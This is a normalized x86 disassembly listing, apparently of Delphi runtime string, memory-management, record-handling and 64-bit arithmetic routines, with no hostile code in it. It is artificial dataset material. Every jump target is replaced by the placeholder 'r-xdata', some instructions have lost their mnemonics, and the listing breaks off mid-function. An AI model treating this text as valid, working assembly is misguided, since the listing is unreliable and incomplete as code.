lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404e44
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4055ac
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404f64
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404f64
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4055ac
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404f34
jmp r-xdata
sub_40503c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404f34
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_40506c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404fa0
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4050b4
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404f34
not ecx
sub_4050cc
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404fa0
not ecx
sub_4050fc
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_402f9c
pop ebx
retn
mov ecx ebx
sub_40512c
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_404e98
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4055ac
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4055ac
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_402f9c
pop edi
pop esi
pop ebx
retn
sub_405170
test edx edx
je r-xdata
mov edx ecx
jmp sub_404e98
test ecx ecx
je sub_404e98
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_40512c
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404f08
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_402f9c
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_402f9c
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_404e98
pop edx
pop eax
jmp sub_40512c
call sub_404e98
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4051e4
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404f08
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4055ac
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_402f9c
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_404e98
dec [ edx - 0x8 ]
sub_405270
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_405330
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404f08
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_402f9c
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_402d44
sub_405384
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404e44
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404f34
jmp r-xdata
pop ebx
retn 0x4
sub_4053c4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_405330#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_402f9c
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4055ac
mov edi ecx
sub_40540c
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4055ac
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_402f9c
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_402f9c
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_405468
push ebx
push esi
add esp 0xfffffff0
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov esi [ edx - 0x4 ]
mov ebx [ eax - 0x4 ]
cmp esi ebx
jl r-xdata
test ebx ebx
jle r-xdata
dec ebx
add esi edx
add edx ebx
mov [ esp + 0x8 ] esi
add eax ebx
mov [ esp + 0x4 ] edx
neg ebx
movzx ecx [ eax ]
mov [ esp ] ebx
jne r-xdata
sub esi 0x2
mov [ esp + 0xc ] esi
sub esi 0x2
mov [ esp + 0xc ] esi
mov esi [ esp ]
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
mov eax edx
sub eax [ esp + 0x4 ]
cmp cl [ edx + 0x1 ]
je r-xdata
add esi 0x2
jl r-xdata
mov esi [ esp ]
add edx 0x2
cmp edx [ esp + 0xc ]
jb r-xdata
add edx 0x2
xor eax eax
cmp edx [ esp + 0x8 ]
ja r-xdata
add edx 0x2
cmp edx [ esp + 0xc ]
jb r-xdata
movzx ebx [ eax + esi ]
cmp bx [ edx + esi ]
jne r-xdata
inc edx
mov eax edx
sub eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
add esi 0x2
jl r-xdata
cmp cl [ edx ]
je r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax edx
sub eax [ esp + 0x4 ]
cmp cl [ edx ]
je r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
movzx ebx [ eax + esi ]
cmp bx [ edx + esi + 0x1 ]
jne r-xdata
add edx 0x2
xor eax eax
cmp edx [ esp + 0x8 ]
ja r-xdata
cmp cl [ edx + 0x1 ]
je r-xdata
cmp cl [ edx ]
je r-xdata
xor eax eax
jmp r-xdata
cmp cl [ edx + 0x1 ]
je r-xdata
cmp cl [ edx ]
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax edx
sub eax [ esp + 0x4 ]
cmp cl [ edx + 0x2 ]
je r-xdata
cmp cl [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cl [ edx + 0x3 ]
je r-xdata
add edx 0x2
cmp cl [ edx + 0x3 ]
je r-xdata
add edx 0x2
add edx 0x4
cmp edx [ esp + 0xc ]
jb r-xdata
add edx 0x2
add edx 0x4
cmp edx [ esp + 0xc ]
jb r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4055ac
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404e44
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404f08
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402d5c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_402f9c
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_405610
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax ecx
call sub_404e44
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404f08
mov [ edi ] eax
mov edx esi
mov cl bl
call sub_403728
sub_405684
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4056a8
cmp [ eax ] edx
je r-xdata
retn
test edx edx
je sub_40566c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_40566c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402e78
sub_4056d0
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_40566c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_405970
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404f84
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404f84
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_405970
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40575c
jmp r-xdata
sub_40575c
test ecx ecx
je sub_40566c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402e78
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_405780
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40575c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4057e8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov ebp edx
mov [ esp ] eax
mov eax ebp
call sub_4057dc
mov ebx eax
mov eax [ esp + 0x4 ]
call sub_4057dc
mov esi eax
test ebx ebx
jne r-xdata
lea eax [ esi + ebx ]
call sub_405644
mov edi eax
mov ecx ebx
add ecx ecx
mov edx edi
mov eax ebp
call sub_402f9c
mov ecx esi
add ecx ecx
lea edx [ edi + ebx * 2 ]
mov eax [ esp + 0x4 ]
call sub_402f9c
mov eax [ esp ]
mov edx edi
call sub_40565c
jmp r-xdata
test esi esi
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
call sub_40566c
sub_405858
push ebx
push esi
push edx
push eax
mov ebx edx
xor eax eax
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
mov ecx [ esp + edx * 4 + 0x10 ]
test ecx ecx
je r-xdata
shr eax 0x1
call sub_405644
push eax
mov esi eax
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_402f9c
mov eax [ esp + ebx * 4 + 0x14 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
call sub_40565c
pop edx
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
sub_4058a0
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_405924
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4057dc
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_40575c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_405970
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_40565c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_405644
mov ebx eax
mov eax [ edi ]
call sub_4057dc
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_402f9c
mov eax esi
sub_4059b4
mov edx [ eax ]
test edx edx
je r-xdata
retn
push eax
mov ecx [ edx - 0x4 ]
shr ecx 0x1
push ecx
push edx
call SysAllocStringLen
pop edx
test eax eax
je r-xdata
mov al 0x1
jmp sub_402e78
mov [ edx ] eax
sub_4059d4
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_405a04
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_405a04
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_405a04
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4059d4
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402e78
sub_405aa4
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_405af0
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_405af0
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_404e68
jmp r-xdata
call sub_404e44
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_405684
jmp r-xdata
call sub_40566c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_405ad8
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_405af0
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_405aa4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_406af4
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_406410
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402e78
sub_405be8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_405c30
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_405c30
push ebx
push esi
push edi
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
add ebx 0x4
call sub_405314
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4059b4
dec edi
jg r-xdata
cmp al 0xc
je r-xdata
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_405c18
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_405c30
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_405be8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
call sub_406b68
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
call sub_406474
dec edi
jg r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402e78
sub_405d08
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_402f9c
mov edx [ eax + esi ]
add eax ebx
call sub_404e98
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4056a8
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_405cf0
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_402f9c
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_405e24
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_405d08
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_406b0c
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_40644c
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402e78
sub_405e24
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404e98
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4056a8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_405cf0
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_405e24
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_405d08
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_406b0c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_40644c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402e78
sub_405f54
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_405f78
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_405f9c
push ebx
push esi
push edi
mov ebx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov esi edx
mov edi ecx
sar esi 0x1f
xor eax esi
xor edx esi
sub eax esi
sbb edx esi
sar edi 0x1f
xor esi edi
xor ebx edi
xor ecx edi
sub ebx edi
sbb ecx edi
jne r-xdata
sub esp 0xc
mov [ esp ] eax
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] edx
mov edi ecx
shr edx 0x1
rcr eax 0x1
ror edi 0x1
rcr ebx 0x1
bsr ecx ecx
shrd ebx edi cl
shrd eax edx cl
shr edx cl
rol edi 0x1
div ebx
mov ebx [ esp ]
mov ecx eax
imul edi eax
mul [ esp + 0x4 ]
add edx edi
sub ebx eax
mov eax ecx
mov ecx [ esp + 0x8 ]
sbb ecx edx
sbb eax 0x0
xor edx edx
add esp 0xc
cmp edx ebx
jb r-xdata
div ebx
mov edx ecx
jmp r-xdata
mov ecx eax
mov eax edx
xor edx edx
div ebx
xchg ecx eax
xor eax esi
xor edx esi
sub eax esi
sbb edx esi
pop edi
pop esi
pop ebx
retn 0x8
sub_406030
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
movzx eax [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
movzx eax [ esi + ebp - 0x1 ]
call sub_40323c
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
movzx edi cl
sub edi 0x30
jmp r-xdata
add al 0xf9
sub al 0x6
jb r-xdata
movzx eax [ esi + ebp - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
movzx eax [ esi + ebp ]
call sub_40323c
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
movzx edi cl
sub edi 0x37
jmp r-xdata
add al 0xe6
sub al 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
movzx edi [ esi + ebp - 0x1 ]
